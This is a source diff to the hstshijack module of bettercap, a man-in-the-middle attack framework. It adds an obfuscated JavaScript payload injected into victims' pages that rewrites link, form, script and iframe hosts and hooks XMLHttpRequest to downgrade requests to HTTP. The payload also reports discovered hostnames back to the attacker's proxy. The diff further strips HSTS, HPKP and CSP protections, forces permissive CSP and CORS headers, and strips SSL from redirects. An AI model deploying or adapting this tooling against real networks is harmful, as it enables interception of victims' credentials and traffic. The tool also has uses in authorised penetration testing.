@@ -5,12 +5,105 @@ var ssl_log = [],
     whitelist = {}
 
 var payload,
-    payload_path,
     payload_container = new String(
     	"if (!{{session_id}}) {\n" + 
     		"var {{session_id}} = function() {\n" + 
     			"{{variables}}\n" + 
-				"{{payload}}\n" + 
+				"var obf_var_callback_log = [];" + 
+				"function obf_func_toWholeRegexp(obf_var_string) {" + 
+					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\")" + 
+					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\")" + 
+					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
+				"}" + 
+				"function obf_func_toWholeWildcardRegexp(obf_var_string) {" + 
+					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\")" + 
+					"obf_var_string = obf_var_string.replace(\"*.\", \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\")" + 
+					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\")" + 
+					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
+				"}" + 
+				"function obf_func_hstshijack(obf_host) {" + 
+					"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
+						"var obf_var_regexp;" + 
+						"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
+							"obf_var_regexp = obf_func_toWholeWildcardRegexp(obf_var_target_hosts[obf_var_i]);" + 
+						"} else {" + 
+							"obf_var_regexp = obf_func_toWholeRegexp(obf_var_target_hosts[obf_var_i]);" + 
+						"}" + 
+						"if (obf_host.match(obf_var_regexp)) {" + 
+							"var obf_var_replacement;" + 
+							"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
+								"obf_var_replacement = \"$1\" + obf_var_replacement_hosts[obf_var_i].replace(/^\\*\\./, \"\");" + 
+							"} else {" + 
+								"obf_var_replacement = obf_var_replacement_hosts[obf_var_i];" + 
+							"}" + 
+							"obf_host = obf_host.replace(obf_var_regexp, obf_var_replacement);" + 
+							"return obf_host;" + 
+						"}" + 
+					"}" + 
+					"return obf_host;" + 
+				"}" + 
+				"function obf_func_attack_XMLHttpRequest() {" + 
+					"var obf_func_open = XMLHttpRequest.prototype.open;" + 
+					"XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {" + 
+						"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
+							"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));" + 
+							"obf_var_path = obf_var_url.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");" + 
+							"obf_var_url = \"http://\" + obf_var_host + obf_var_path;" + 
+						"}" + 
+						"return obf_func_open.apply(this, arguments);" + 
+					"}" + 
+				"}" + 
+				"function obf_func_callback(obf_var_data) {" + 
+					"obf_var_req = new XMLHttpRequest();" + 
+					"obf_var_req.open(\"GET\", \"http://\" + location.host + \"/obf_path_ssl_log?\" + obf_var_data, true);" + 
+					"obf_var_req.send();" + 
+				"}" + 
+				"function obf_func_attack() {" + 
+					"try {" + 
+						"obf_var_regexp = new RegExp(\"http[s]?:\\\\/\\\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\\\.)+(?:[a-z]{1,63}))\", \"ig\");" + 
+						"obf_var_urls = document.body.innerHTML.match(obf_var_regexp);" + 
+						"for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {" + 
+							"obf_var_host = obf_var_urls[obf_var_i].replace(obf_var_regexp, \"$1\");" + 
+							"if (obf_var_callback_log.indexOf(obf_var_host) == -1) {" + 
+								"obf_func_callback(btoa(obf_var_host));" + 
+								"obf_var_callback_log.push(obf_var_host);" + 
+							"}" + 
+						"}" + 
+					"} catch(obf_ignore){}" + 
+					"try {" + 
+						"document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node){" + 
+							"obf_var_url = \"\";" + 
+							"switch (obf_var_node.tagName) {" + 
+								"case \"A\": obf_var_node.href ? obf_var_url = obf_var_node.href : \"\"; break;" + 
+								"case \"FORM\": obf_var_node.action ? obf_var_url = obf_var_node.action : \"\"; break;" + 
+								"case \"SCRIPT\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
+								"case \"IFRAME\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
+							"}" + 
+							"if (obf_var_url.match(/^http[s]?:\\/\\/[^/?#]+(?:[/?#].*$)?/i)) {" + 
+								"obf_var_path = obf_var_url.replace(/^http[s]?:\\/\\/[^:/?#]+([:/?#].*$)?/i, \"$1\");" + 
+								"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*/i, \"$1\"));" + 
+								"switch (obf_var_node.tagName) {" + 
+									"case \"A\": obf_var_node.href ? obf_var_node.href = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"FORM\": obf_var_node.action ? obf_var_node.action = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"SCRIPT\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+									"case \"IFRAME\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
+								"}" + 
+							"}" + 
+						"});" + 
+					"} catch(obf_ignore){}" + 
+				"}" + 
+				"setInterval(function(){" + 
+					"obf_func_attack();" + 
+					"obf_func_attack_XMLHttpRequest();" + 
+				"}, 666);" + 
+				"try {" + 
+					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack);" + 
+					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest);" + 
+				"} catch(obf_ignore){" + 
+					"self.addEventListener(\"load\", obf_func_attack);" + 
+					"self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest);" + 
+				"}" + 
+				"obf_func_attack();" + 
 				"{{custom_payload}}\n" + 
     		"}\n" + 
     		"{{session_id}}();\n" + 
@@ -40,6 +133,7 @@ var red      = "\033[31m",
     blue     = "\033[34m",
     on_white = "\033[47;30m",
     on_grey  = "\033[40;37m",
+    on_blue  = "\033[104;30m",
     bold     = "\033[1;37m",
     reset    = "\033[0m"
 
@@ -88,31 +182,30 @@ function toWholeWildcardRegexp(string) {
 
 function configure() {
 	// Read caplet.
-	env["hstshijack.payload"]        ? payload_path       = env["hstshijack.payload"].replace(/\s/g, "")                   : log_fatal("[" + green + "hstshijack" + reset + "] No hstshijack.payload specified.")
 	env["hstshijack.ignore"]         ? ignore_hosts       = env["hstshijack.ignore"].replace(/\s/g, "").split(",")         : ignore_hosts       = []
 	env["hstshijack.targets"]        ? target_hosts       = env["hstshijack.targets"].replace(/\s/g, "").split(",")        : target_hosts       = []
 	env["hstshijack.replacements"]   ? replacement_hosts  = env["hstshijack.replacements"].replace(/\s/g, "").split(",")   : replacement_hosts  = []
 	env["hstshijack.blockscripts"]   ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")   : block_script_hosts = []
-	env["hstshijack.custompayloads"] ? custom_payloads    = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",") : custom_payloads    = []
+	env["hstshijack.payloads"]       ? custom_payloads    = env["hstshijack.payloads"].replace(/\s/g, "").split(",")       : custom_payloads    = []
 	env["hstshijack.obfuscate"]      ? obfuscate          = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()   : obfuscate          = false
 	env["hstshijack.encode"]         ? encode             = env["hstshijack.encode"].replace(/\s/g, "").toLowerCase()      : encode             = false
 
 	// Validate caplet.
-	target_hosts.length < replacement_hosts.length ? log_fatal("[" + green + "hstshijack" + reset + "] Too many hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
-	target_hosts.length > replacement_hosts.length ? log_fatal("[" + green + "hstshijack" + reset + "] Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
-	target_hosts.indexOf("*") != -1                 ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.targets value (got *).") : ""
-	replacement_hosts.indexOf("*") != -1            ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.replacements value (got *).") : ""
+	target_hosts.length < replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
+	target_hosts.length > replacement_hosts.length ? log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
+	target_hosts.indexOf("*") != -1                 ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).") : ""
+	replacement_hosts.indexOf("*") != -1            ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).") : ""
 	for (var i = 0; i < ignore_hosts.length; i++) {
 		!ignore_hosts[i].match(/^(?:\*$|\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[i] + ").") : ""
 	}
 	for (var i = 0; i < target_hosts.length; i++) {
-		!target_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.targets value (got " + target_hosts[i] + ").") : ""
+		!target_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[i] + ").") : ""
 	}
 	for (var i = 0; i < replacement_hosts.length; i++) {
-		!replacement_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") : ""
+		!replacement_hosts[i].match(/^(?:\*\.[a-z0-9]{1,63}(?:[.]?[a-z0-9]{1,63})*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") : ""
 	}
 	for (var i = 0; i < block_script_hosts.length; i++) {
-		!block_script_hosts[i].match(/^(?:\*\.[a-z]+$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
+		!block_script_hosts[i].match(/^(?:\*\.[a-z]+$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
 	}
 	if (obfuscate == "false") {
 		obfuscate = false
@@ -124,14 +217,14 @@ function configure() {
 	p = {}
 	for (var a = 0; a < custom_payloads.length; a++) {
 		if ( !custom_payloads[a].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ) {
-			log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.custompayloads value (got " + custom_payloads[a] + ").")
+			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + custom_payloads[a] + ").")
 		}
 
 		host = custom_payloads[a].replace(/[:].*/, "")
 		path = custom_payloads[a].replace(/.*[:]/, "")
 
 		if ( !readFile(path) ) {
-			log_error("[" + green + "hstshijack" + reset + "] Could not read a path in hstshijack.custompayloads (got " + path + ").")
+			log_error(on_blue + "hstshijack" + reset + " Could not read a path in hstshijack.payloads (got " + path + ").")
 		} else {
 			custom_payload = readFile(path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)
 
@@ -152,13 +245,9 @@ function configure() {
 		}
 	}
 	custom_payloads = p
-	// Read core payload.
-	if ( !readFile(payload_path) ) {
-		log_fatal("[" + green + "hstshijack" + reset + "] Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
-	}
 	// Prepare core payload.
-	payload = readFile(payload_path).replace(/\$/g, "$$$$$$$$")
-	payload = payload_container.replace("{{payload}}", payload)
+	payload = payload_container.replace(/\$/g, "$$$$$$$$")
+	payload = payload.replace("{{payload}}", payload)
 	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
 	payload = payload.replace("obf_path_whitelist", whitelist_path)
 	payload = payload.replace("obf_path_callback", callback_path)
@@ -183,7 +272,7 @@ function configure() {
 			if ( ssl_log.indexOf(target) == -1 ) {
 				ssl_log.push(target)
 				writeFile( env["hstshijack.log"], ssl_log.join("\n") )
-				env["hstshijack.log"] ? log_debug("[" + green + "hstshijack" + reset + "] Saved " + target + " to SSL log.") : ""
+				env["hstshijack.log"] ? log_debug(on_blue + "hstshijack" + reset + " Saved " + target + " to SSL log.") : ""
 			}
 		}
 	}
@@ -199,16 +288,15 @@ function showModule() {
 	logStr += "  " + bold + "Caplet" + reset + "\n"
 	logStr += "\n"
 	logStr += "    " + yellow + "           hstshijack.log" + reset + " > " + ( env["hstshijack.log"] ? green + env["hstshijack.log"] : red + "undefined" ) + reset + "\n"
-	logStr += "    " + yellow + "       hstshijack.payload" + reset + " > " + green + env["hstshijack.payload"] + reset + "\n"
 	logStr += "    " + yellow + "        hstshijack.ignore" + reset + " > " + ( env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
 	logStr += "    " + yellow + "        hstshijack.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
-	logStr += "    " + yellow + "hstshijack.custompayloads" + reset + " > "
-	if ( env["hstshijack.custompayloads"] ) {
-			list = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",")
+	logStr += "    " + yellow + "hstshijack.payloads" + reset + " > "
+	if ( env["hstshijack.payloads"] ) {
+			list = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
 			logStr += green + list[0] + reset + "\n"
 			if (list.length > 1) {
 				for ( var i = 0; i < (list.length-1); i++ ) {
@@ -240,7 +328,7 @@ function onLoad() {
 	math_seed = new Date().getMilliseconds()
 	Math.random = function() { return randomFloat() }
 
-	log_info("[" + green + "hstshijack" + reset + "] Generating random variable names for this session ...")
+	log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...")
 	session_id            = randomString( 4 + Math.random() * 12 )
 	callback_path         = randomString( 4 + Math.random() * 12 )
 	whitelist_path        = randomString( 4 + Math.random() * 12 )
@@ -248,17 +336,17 @@ function onLoad() {
 	var_target_hosts      = randomString( 4 + Math.random() * 12 )
 	var_replacement_hosts = randomString( 4 + Math.random() * 12 )
 
-	log_info("[" + green + "hstshijack" + reset + "] Reading SSL log ...")
+	log_info(on_blue + "hstshijack" + reset + " Reading SSL log ...")
 	if ( !readFile( env["hstshijack.log"] ) ) {
-		log_info("[" + green + "hstshijack" + reset + "] No SSL log file found, creating one now ...")
+		log_info(on_blue + "hstshijack" + reset + " No SSL log file found, creating one now ...")
 		writeFile(env["hstshijack.log"], "")
 	}
 	ssl_log = readFile( env["hstshijack.log"] ).split("\n")
 
-	log_info("[" + green + "hstshijack" + reset + "] Reading caplet ...")
+	log_info(on_blue + "hstshijack" + reset + " Reading caplet ...")
 	configure()
 
-	log_info("[" + green + "hstshijack" + reset + "] Module loaded.")
+	log_info(on_blue + "hstshijack" + reset + " Module loaded.")
 	showModule()
 }
 
@@ -274,7 +362,7 @@ function onRequest(req, res) {
 		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
 		if (req.Path == "/" + ssl_log_path) {
 			queried_host = atob(req.Query)
-			log_debug("[" + green + "hstshijack" + reset + "] Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
+			log_debug(on_blue + "hstshijack" + reset + " Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
 			for (var i = 0; i < target_hosts.length; i++) {
 				var regexp
 				if ( target_hosts[i].indexOf("*") != -1 ) {
@@ -284,7 +372,7 @@ function onRequest(req, res) {
 				}
 				if ( queried_host.match(regexp) ) {
 					if ( ssl_log.indexOf(queried_host) == -1 ) {
-						log_debug("[" + green + "hstshijack" + reset + "] Learning HTTP response from " + queried_host + " ...")
+						log_debug(on_blue + "hstshijack" + reset + " Learning HTTP response from " + queried_host + " ...")
 						req.Hostname = queried_host
 						req.Path     = "/"
 						req.Query    = ""
@@ -300,7 +388,7 @@ function onRequest(req, res) {
 		// Requests made for this path will print sniffed data.
 		// Requests made for this path will not be proxied.
 		if (req.Path == "/" + callback_path) {
-			log_info("[" + green + "hstshijack" + reset + "] Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
+			log_info(on_blue + "hstshijack" + reset + " Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
 
@@ -338,7 +426,7 @@ function onRequest(req, res) {
 		// Requests made for this path will not be proxied.
 		// Requests made for this path will stop all attacks towards this client for the requested hostname.
 		if (req.Path == "/" + whitelist_path) {
-			log_info("[" + green + "hstshijack" + reset + "] Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
+			log_info(on_blue + "hstshijack" + reset + " Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
 
@@ -434,7 +522,7 @@ function onRequest(req, res) {
 					}
 					res.SetHeader("bettercap", "ignore")
 					ignored = true
-					log_info("[" + green + "hstshijack" + reset + "] Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
+					log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
 					break
 				}
 			}
@@ -455,7 +543,7 @@ function onRequest(req, res) {
 				}
 				if ( req.Headers.match(regexp) ) {
 					req.Headers = req.Headers.replace( regexp, "$1" + target_hosts[a].replace("*.", "") + "$2" )
-					log_debug("[" + green + "hstshijack" + reset + "] Patched spoofed hostname(s) in request header(s).")
+					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname(s) in request header(s).")
 				}
 
 				// Patch spoofed hostname of request.
@@ -472,7 +560,7 @@ function onRequest(req, res) {
 						req.Hostname = req.Hostname.replace(regexp, target_hosts[a])
 					}
 					req.Scheme   = "https"
-					log_debug("[" + green + "hstshijack" + reset + "] Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
+					log_debug(on_blue + "hstshijack" + reset + " Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
 				}
 			}
 
@@ -481,7 +569,7 @@ function onRequest(req, res) {
 				regexp = new RegExp( "http://" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^a-z0-9\\-\\.]|$)", "ig" )
 				if ( req.Headers.match(regexp) ) {
 					req.Headers = req.Headers.replace(regexp, "https://" + ssl_log[a] + "$1")
-					log_debug("[" + green + "hstshijack" + reset + "] Patched SSL of " + ssl_log[a] + " in request headers.")
+					log_debug(on_blue + "hstshijack" + reset + " Patched SSL of " + ssl_log[a] + " in request headers.")
 				}
 			}
 
@@ -489,7 +577,7 @@ function onRequest(req, res) {
 			if (req.Scheme != "https") {
 				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
 					req.Scheme = "https"
-					log_debug("[" + green + "hstshijack" + reset + "] Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
+					log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
 				} else {
 					for (var i = 0; i < target_hosts; i++) {
 						var regexp
@@ -500,7 +588,7 @@ function onRequest(req, res) {
 						}
 						if ( req.Hostname.match(regexp) ) {
 							req.Scheme = "https"
-							log_debug("[" + green + "hstshijack" + reset + "] Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
+							log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
 						}
 					}
 				}
@@ -525,7 +613,7 @@ function onResponse(req, res) {
 		if ( ssl_log.indexOf(host) == -1 ) {
 			ssl_log.push(host)
 			writeFile( env["hstshijack.log"], ssl_log.join("\n") )
-			log_debug("[" + green + "hstshijack" + reset + "] Saved " + host + " to SSL log.")
+			log_debug(on_blue + "hstshijack" + reset + " Saved " + host + " to SSL log.")
 		}
 	}
 
@@ -537,7 +625,7 @@ function onResponse(req, res) {
 	if ( res.GetHeader("bettercap", "") == "ignore" ) {
 		res.RemoveHeader("bettercap")
 		ignored = true
-		log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
+		log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
 	} else {
 		for (var a = 0; a < ignore_hosts.length; a++) {
 			var regexp
@@ -576,7 +664,7 @@ function onResponse(req, res) {
 					}
 				}
 				if (ignored) {
-					log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
+					log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
 				}
 				break
 			}
@@ -592,12 +680,12 @@ function onResponse(req, res) {
 		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
 			meta_tags = res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")(.*?)(\/\s*|)>/ig) || []
 			for (var a = 0; a < meta_tags.length; a++) {
-				log_debug("[" + green + "hstshijack" + reset + "] Found " + meta_tags.length + " meta tag(s) in the response body.")
+				log_debug(on_blue + "hstshijack" + reset + " Found " + meta_tags.length + " meta tag(s) in the response body.")
 
 				if ( meta_tags[a].match(/https:\/\//ig) ) {
 					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
 					res.Body.replace(meta_tags[a], replacement)
-					log_debug("[" + green + "hstshijack" + reset + "] Stripped meta tag(s) from SSL.")
+					log_debug(on_blue + "hstshijack" + reset + " Stripped meta tag(s) from SSL.")
 				}
 
 				// Hijack hostnames in redirecting meta tags.
@@ -612,11 +700,15 @@ function onResponse(req, res) {
 					if ( meta_tags[a].match(regexp) ) {
 						hijacked_meta_tag = "$1" + meta_tags[a].replace( regexp, replacement_hosts.replace("*.", "") ) + "$2"
 						res.Body = res.Body.replace(meta_tags[a], hijacked_meta_tag)
-						log_debug("[" + green + "hstshijack" + reset + "] Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
+						log_debug(on_blue + "hstshijack" + reset + " Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
 					}
 				}
 			}
 		}
+
+	/* Attack meta tag CSP restrictions */
+
+		res.Body = res.Body.replace(/http-equiv=('|")Content-Security-Policy('|")/ig, "http-equiv=$1Content-Insecure-Policy$2")
 
 	/* JavaScript */
 
@@ -634,7 +726,7 @@ function onResponse(req, res) {
 				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
 					res.Body = ""
 				}
-				log_debug("[" + green + "hstshijack" + reset + "] Blocked script(s) from " + bold + req.Hostname + reset + ".")
+				log_debug(on_blue + "hstshijack" + reset + " Blocked script(s) from " + bold + req.Hostname + reset + ".")
 				break
 			}
 		}
@@ -656,7 +748,7 @@ function onResponse(req, res) {
 
 				if ( req.Hostname.match(regexp) ) {
 					injection = injection.replace("{{custom_payload}}", custom_payloads[host].payload + "\n{{custom_payload}}")
-					log_debug("[" + green + "hstshijack" + reset + "] Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
+					log_debug(on_blue + "hstshijack" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
 				}
 			}
 
@@ -664,14 +756,14 @@ function onResponse(req, res) {
 
 			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
 				res.Body = injection.replace(/.*/g, injection) + res.Body // Replace once more to unescape "$$$$$$$$" to a single "$"
-				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
+				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
 			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
 				if (encode) {
 					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
 				} else {
 					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>" + injection + "</script>")
 				}
-				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
+				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
 			}
 		}
 
@@ -681,7 +773,7 @@ function onResponse(req, res) {
 		location = res.GetHeader("Location", "")
 		if (location != "") {
 			res.SetHeader( "Location", location.replace(/(http)s:\/\//i, "$1://") )
-			log_debug("[" + green + "hstshijack" + reset + "] Stripped SSL from location header.")
+			log_debug(on_blue + "hstshijack" + reset + " Stripped SSL from location header.")
 		}
 
 		// Replace hosts in headers.
@@ -694,13 +786,12 @@ function onResponse(req, res) {
 			}
 			if ( res.Headers.match(regexp) ) {
 				res.Headers = res.Headers.replace( regexp, "$1" + replacement_hosts[a].replace("*.", "") + "$2" )
-				log_debug("[" + green + "hstshijack" + reset + "] Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
+				log_debug(on_blue + "hstshijack" + reset + " Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
 			}
 		}
 
 		// Remove security headers.
 		res.RemoveHeader("Strict-Transport-Security")
-		res.RemoveHeader("Content-Security-Policy")
 		res.RemoveHeader("Content-Security-Policy-Report-Only")
 		res.RemoveHeader("Public-Key-Pins")
 		res.RemoveHeader("Public-Key-Pins-Report-Only")
@@ -714,6 +805,7 @@ function onResponse(req, res) {
 		res.RemoveHeader("Expect-Ct")
 
 		// Set insecure headers.
+		res.SetHeader("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
 		res.SetHeader("Access-Control-Allow-Origin", "*")
 		res.SetHeader("Access-Control-Allow-Methods", "*")
 		res.SetHeader("Access-Control-Allow-Headers", "*")
